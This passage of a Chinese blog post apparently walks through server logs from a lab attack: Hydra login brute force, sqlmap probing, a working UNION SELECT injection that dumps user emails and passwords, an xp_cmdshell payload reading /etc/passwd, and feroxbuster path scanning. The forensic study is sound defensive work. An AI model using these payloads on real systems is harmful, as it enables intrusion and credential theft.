<span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:28 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 401 26 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br></code></pre></td></tr></table></figure><p>被爆破成功了,有一条200状态码记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:16:31 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.0&quot;</span> 200 831 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br></code></pre></td></tr></table></figure><p>攻击者又回到了它自己注册的账户：whoami，在此期间有很多记录一直表示攻击者在循环登录退出登录退出登录退出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:23:32 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:32 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:32 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:54 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:54 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:54 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:55 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:55 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:55 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:58 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:58 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:23:58 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:15 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:15 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:15 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:18 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:18 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:18 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:25 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:25 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:25 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:27 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:27 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:27 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:28 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:28 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:29 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:29 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:29 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:26:29 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br></code></pre></td></tr></table></figure><p>初步判定其可能是在抓登录的数据包。然后它发现了&#x2F;rest&#x2F;products&#x2F;search?q&#x3D;，开始尝试SQLMAP一把梭哈：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:29:14 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1 HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1&amp;QKqc=7074%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1 HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=6813 HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1.%22%27%28%2C.%2C%29%2C. HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=5076-5075 HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1.9xqhL HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%27cjocta%3C%27%22%3ETuFsMe HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%29%20AND%203747%3D9627%20AND%20%288054%3D8054 HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%29%20AND%209700%3D9700%20AND%20%283503%3D3503 HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%20AND%206384%3D1910 HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%20AND%209700%3D9700 HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%20AND%206826%3D9654--%20qXOs HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=1%20AND%209700%3D9700--%20jEIr HTTP/1.1&quot;</span> 200 30 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;sqlmap/1.5.2#stable (http://sqlmap.org)&quot;</span><br></code></pre></td></tr></table></figure><p>而且注入成功了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:31:04 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users-- HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:32:51 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users-- HTTP/1.1&quot;</span> 200 3742 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;curl/7.74.0&quot;</span><br></code></pre></td></tr></table></figure><p>但它只是查询了一些数据，并没有直接写shell，也没有尝试登录管理员，可能数据库中获取到的数据对于当下的它来说没有一些实际作用，之后用feroxbuster又对HTTP服务进行了路径爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /a54372a1404141fe8842ae5c029a00e3 HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /3e72ead66df04ca5bff7c9b741883cfbd3044c03e5114f7589804da12c36e5bafa6807b272cf4288ae1316f157b1fab2 HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /api HTTP/1.1&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /administartion HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /login HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /admin HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /backup HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /promotion HTTP/1.1&quot;</span> 200 6586 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] <span class="hljs-string">&quot;GET /ftp HTTP/1.1&quot;</span> 200 4852 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;feroxbuster/2.2.1&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:40 +0000] <span class="hljs-string">&quot;GET /ftp/www-data.bak HTTP/1.1&quot;</span> 403 300 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:34:43 +0000] <span class="hljs-string">&quot;GET /ftp/coupons_2013.md.bak HTTP/1.1&quot;</span> 403 78965 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;&quot;</span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<span class="hljs-string">&quot;</span><br><span class="hljs-string">::ffff:192.168.10.5 - - [11/Apr/2021:09:34:45 +0000] &quot;</span>GET /favicon.ico HTTP/1.1<span class="hljs-string">&quot; 200 - &quot;</span>-<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<span class="hljs-string">&quot;</span><br><span class="hljs-string">::ffff:192.168.10.5 - - [11/Apr/2021:09:34:49 +0000] &quot;</span>GET /favicon.ico HTTP/1.1<span class="hljs-string">&quot; - - 